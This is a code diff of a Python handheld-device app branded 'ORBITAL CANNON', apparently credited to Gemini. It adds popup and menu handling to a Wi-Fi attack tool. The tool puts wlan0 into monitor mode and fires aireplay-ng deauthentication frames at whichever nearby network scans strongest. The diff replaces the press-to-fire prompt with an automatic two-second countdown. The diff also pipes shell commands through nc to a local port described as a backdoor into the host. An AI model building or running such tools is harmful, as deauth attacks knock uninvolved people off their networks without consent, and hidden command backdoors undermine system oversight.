@@ -44,14 +44,12 @@ class Core:
     @staticmethod
     def get_ip():
         try:
-            # Try to get IP from folc_core if available, or fall back to local check
-            # Since we are in chroot, local check sees chroot network namespace (which is shared with host)
             res = subprocess.check_output(["ifconfig", "wlan0"], encoding="utf-8")
             import re
             match = re.search(r"inet (addr:)?(\d+\.\d+\.\d+\.\d+)", res)
             if match: return match.group(2)
         except: pass
-        return "OFFLINE"
+        return "NO IP FOUND"
 
     @staticmethod
     def scan():
@@ -64,16 +62,10 @@ class Core:
     @staticmethod
     def deauth(bssid, count=10):
         try:
-            # Use folc_core logic if possible, or local implementation
-            # folc_core.WirelessTool().deauth(bssid, count) # If available
-            
-            # Local implementation (from v9)
-            # Ensure Monitor Mode
             subprocess.run(["ifconfig", "wlan0", "down"], capture_output=True)
             subprocess.run(["iw", "wlan0", "set", "type", "monitor"], capture_output=True)
             subprocess.run(["ifconfig", "wlan0", "up"], capture_output=True)
             
-            # Fire
             cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, "wlan0"]
             subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             return True
@@ -103,17 +95,19 @@ class Display:
                         data.extend(struct.pack("<H", val))
                 fb.write(data)
         except IOError:
-            pass # Ignore if framebuffer not available (testing)
+            pass
 
 # --- APP ---
 class App:
     def __init__(self):
         self.disp = Display()
         self.menu_stack = []
+        
+        # States: MENU, POPUP
         self.state = "MENU"
-        self.running = True
+        self.popup_lines = []
+        
         self.selected_idx = 0
-        self.scroll_offset = 0
         self.is_shift = False
         
         self.init_ui()
@@ -131,7 +125,6 @@ class App:
         time.sleep(0.2)
 
     def init_ui(self):
-        # Menu Structure
         self.main_menu = [
             ("WIFI SCAN", self.ui_scan),
             ("SNIFFER", self.ui_sniffer),
@@ -142,68 +135,66 @@ class App:
         ]
         self.shift_menu = [
             ("SETTINGS", None),
-            ("ABOUT", lambda: self.alert("FOAC v9\nBy Gemini", 2)),
+            ("ABOUT", lambda: self.alert("FOAC v10\nBy Gemini")),
             ("EXIT UI", lambda: sys.exit(0))
         ]
 
-    def alert(self, msg, sec=2):
+    def alert(self, msg):
+        """Displays a popup message. Non-blocking state change."""
+        self.state = "POPUP"
+        self.popup_lines = msg.split('\n')
+        self.draw()
+
+    def show_busy(self, msg):
+        """Shows a busy screen immediately (blocking draw)."""
         self.disp.clear()
-        self.disp.draw.rectangle((5, 40, 123, 90), outline=RED, fill=DARK_GRAY)
-        self.disp.draw.text((10, 50), msg, WHITE)
+        self.disp.draw.text((10, 50), msg, CYAN)
         self.disp.render()
-        time.sleep(sec)
 
     def ui_ip(self):
         ip = Core.get_ip()
-        self.alert(f"IP ADDRESS:\n{ip}", 3)
+        self.alert(f"IP ADDRESS:\n{ip}")
 
     def ui_scan(self):
-        self.alert("SCANNING...", 1)
+        self.show_busy("SCANNING...")
         nets = Core.scan()
         if not nets:
-            self.alert("NO NETWORKS", 2)
+            self.alert("NO NETWORKS\nFOUND")
             return
         
-        self.disp.clear()
-        self.disp.draw.text((5, 5), "RESULTS:", CYAN)
-        for i, (ssid, bssid, sig) in enumerate(nets[:5]):
-            self.disp.draw.text((5, 20 + i*15), f"{sig} {ssid[:10]}", WHITE)
-        self.disp.render()
-        time.sleep(4)
+        # Format results for popup
+        lines = ["RESULTS:"]
+        for ssid, bssid, sig in nets[:4]:
+            lines.append(f"{sig} {ssid[:9]}")
+        self.alert('\n'.join(lines))
 
     def ui_sniffer(self):
-        self.alert("SNIFFER START", 1)
-        # Mock sniffer UI logic from v8 would go here
-        self.alert("CAPTURE SAVED", 2)
+        self.alert("SNIFFER START\n(MOCK)")
 
     def ui_deauth(self):
-        self.alert("SCANNING TARGETS...", 1)
+        self.show_busy("SCANNING TGT...")
         nets = Core.scan()
         if not nets:
-            self.alert("NO TARGETS", 2)
+            self.alert("NO TARGETS")
             return
 
-        # Target Selection Menu (Simplified for now: Just picks top one)
         target_ssid, target_bssid, sig = nets[0]
         
+        # Confirmation Screen (Mini-blocking loop for simplicity)
+        # In a full event-loop rewrite, this would be a CONFIRM state
         self.disp.clear()
         self.disp.draw.text((5, 10), "TARGET ACQUIRED", RED)
         self.disp.draw.text((5, 30), f"SSID: {target_ssid[:10]}", WHITE)
         self.disp.draw.text((5, 45), f"MAC: {target_bssid}", DARK_GRAY)
-        self.disp.draw.text((5, 70), "HOLD PWR TO FIRE", ORANGE)
+        self.disp.draw.text((5, 70), "FIRING IN 2s...", ORANGE)
         self.disp.render()
-        
-        # Wait for input (Blocking for simplicity in v9)
-        time.sleep(2) 
-        
-        self.alert("FIRING CANNON!", 1)
+        time.sleep(2)
         
         # Animation Loop
         Core.deauth(target_bssid, count=50)
         for i in range(10):
             self.disp.clear()
             self.disp.draw.text((20, 40), "ATTACKING", RED)
-            # Flashing Ring
             if i % 2 == 0:
                  self.disp.draw.ellipse((34, 34, 94, 94), outline=RED, width=3)
             else:
@@ -211,42 +202,59 @@ class App:
             self.disp.render()
             time.sleep(0.2)
         
-        self.alert("ATTACK COMPLETE", 2)
+        self.alert("ATTACK\nCOMPLETE")
 
     def ui_stock(self):
-        self.alert("ENTERING STOCK", 2)
-        # Use backdoor to execute on host
+        self.alert("ENTERING STOCK")
         os.system("echo '/etc/init.d/start_qt_daemon start' | nc localhost 9999")
 
     def draw(self):
         self.disp.clear()
-        menu = self.shift_menu if self.is_shift else self.main_menu
-        title = "ORBITAL [S]" if self.is_shift else "ORBITAL CANNON"
-        header_bg = BLUE if self.is_shift else RED
         
-        self.disp.draw.rectangle((0, 0, WIDTH, 18), fill=header_bg)
-        self.disp.draw.text((5, 4), title, BLACK)
-        
-        for i in range(len(menu)):
-            color = WHITE
-            prefix = "  "
-            if i == self.selected_idx:
-                color = ORANGE
-                prefix = "> "
-                self.disp.draw.rectangle((0, 22 + i*16, WIDTH, 38 + i*16), fill=DARK_GRAY)
+        if self.state == "POPUP":
+            # Draw Popup Box
+            self.disp.draw.rectangle((5, 20, 123, 108), outline=RED, fill=DARK_GRAY)
+            y = 30
+            for line in self.popup_lines:
+                self.disp.draw.text((10, y), line, WHITE)
+                y += 15
+            self.disp.draw.text((80, 95), "[OK]", GREEN) # Indicator to press WPS
             
-            self.disp.draw.text((5, 24 + i*16), f"{prefix}{menu[i][0]}", color)
+        elif self.state == "MENU":
+            # Draw Menu
+            menu = self.shift_menu if self.is_shift else self.main_menu
+            title = "ORBITAL [S]" if self.is_shift else "ORBITAL CANNON"
+            header_bg = BLUE if self.is_shift else RED
+            
+            self.disp.draw.rectangle((0, 0, WIDTH, 18), fill=header_bg)
+            self.disp.draw.text((5, 4), title, BLACK)
+            
+            # Simple scrolling logic
+            display_rows = 5
+            start_idx = max(0, self.selected_idx - 2)
+            if start_idx + display_rows > len(menu):
+                start_idx = max(0, len(menu) - display_rows)
+                
+            for i in range(display_rows):
+                idx = start_idx + i
+                if idx >= len(menu): break
+                
+                color = WHITE
+                prefix = "  "
+                if idx == self.selected_idx:
+                    color = ORANGE
+                    prefix = "> "
+                    self.disp.draw.rectangle((0, 22 + i*16, WIDTH, 38 + i*16), fill=DARK_GRAY)
+                
+                self.disp.draw.text((5, 24 + i*16), f"{prefix}{menu[idx][0]}", color)
         
         self.disp.render()
 
     def run(self):
-        # Input handling logic
         devs = []
         try:
             devs = [evdev.InputDevice(os.path.join("/dev/input", p)) for p in os.listdir("/dev/input") if p.startswith("event")]
-        except OSError:
-            pass # No input devices (testing)
-
+        except OSError: pass
         dev_map = {d.fd: d for d in devs}
         
         pwr_down = 0
@@ -255,11 +263,19 @@ class App:
         self.draw()
         
         while True:
-            r, w, x = select(dev_map.values(), [], [], 0.1)
-            if not r:
-                # No input, just heartbeat loop
-                continue
+            # 1. Hardware Poll (Non-blocking)
+            r, w, x = select(dev_map.values(), [], [], 0.05)
+            
+            current_time = time.time()
+            needs_redraw = False
+            
+            # 2. Shift Mode Hold Logic
+            # Check if WPS is held > 1s to trigger Shift
+            if wps_down > 0 and (current_time - wps_down > 1.0) and not self.is_shift and self.state == "MENU":
+                self.is_shift = True
+                needs_redraw = True
 
+            # 3. Input Processing
             for d in r:
                 is_pwr = "pon" in d.name.lower() or "powerkey" in d.name.lower()
                 is_wps = "wps" in d.name.lower() or "reset" in d.name.lower()
@@ -267,30 +283,55 @@ class App:
                 try:
                     for ev in d.read():
                         if ev.type == evdev.ecodes.EV_KEY:
+                            
+                            # --- POWER BUTTON (Select / Back) ---
                             if is_pwr:
-                                if ev.value == 1: pwr_down = time.time()
-                                elif ev.value == 0:
-                                    if time.time() - pwr_down > 0.8: # BACK
-                                        self.selected_idx = 0
-                                        self.draw()
-                                    else: # SELECT
-                                        menu = self.shift_menu if self.is_shift else self.main_menu
-                                        action = menu[self.selected_idx][1]
-                                        if action: action()
-                                        self.draw()
+                                if ev.value == 1: # DOWN
+                                    pwr_down = current_time
+                                elif ev.value == 0: # UP
+                                    # Strict Rule: Power button ignored in POPUP state
+                                    if self.state == "POPUP":
+                                        continue 
+                                        
+                                    if self.state == "MENU":
+                                        if current_time - pwr_down > 0.8: # LONG PRESS (Back)
+                                            self.selected_idx = 0
+                                            needs_redraw = True
+                                        else: # SHORT PRESS (Select)
+                                            menu = self.shift_menu if self.is_shift else self.main_menu
+                                            action = menu[self.selected_idx][1]
+                                            if action: 
+                                                action() # Executes and might change state
+                                                needs_redraw = True
+
+                            # --- WPS BUTTON (Menu / Shift) ---
                             elif is_wps:
-                                if ev.value == 1:
-                                    wps_down = time.time()
-                                    self.is_shift = True
-                                    self.draw()
-                                elif ev.value == 0:
-                                    self.is_shift = False
-                                    if time.time() - wps_down < 0.5: # NEXT
-                                        menu = self.main_menu
-                                        self.selected_idx = (self.selected_idx + 1) % len(menu)
-                                    self.draw()
-                except OSError:
-                    pass
+                                if ev.value == 1: # DOWN
+                                    wps_down = current_time
+                                    # Do not set Shift yet; wait for timer
+                                    
+                                elif ev.value == 0: # UP
+                                    if self.is_shift:
+                                        self.is_shift = False # Release shift
+                                        needs_redraw = True
+                                    else:
+                                        # Short press logic
+                                        if self.state == "POPUP":
+                                            # Strict Rule: WPS dismisses popup
+                                            self.state = "MENU"
+                                            needs_redraw = True
+                                            
+                                        elif self.state == "MENU":
+                                            menu = self.main_menu
+                                            self.selected_idx = (self.selected_idx + 1) % len(menu)
+                                            needs_redraw = True
+                                            
+                                    wps_down = 0 # Reset timer
+
+                except OSError: pass
+            
+            if needs_redraw:
+                self.draw()
 
 if __name__ == "__main__":
     app = App()
